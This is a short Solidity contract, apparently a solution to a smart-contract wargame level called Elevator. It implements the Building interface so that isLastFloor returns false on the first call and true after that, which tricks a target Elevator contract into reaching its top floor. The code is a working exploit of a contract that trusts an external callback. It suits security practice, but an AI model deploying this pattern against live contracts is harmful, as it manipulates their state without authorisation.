pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  function goTo(uint _floor) public{}
}

contract forceEnd is Building{
      uint count = 0;
      function isLastFloor(uint) view public returns (bool){
        if(count == 0){
            count=1;
            return false;
        } else {
            return true;
        }        
      }
      function endIt(address param) public{
          Elevator target = Elevator(param);
          target.goTo(8787);
      }
}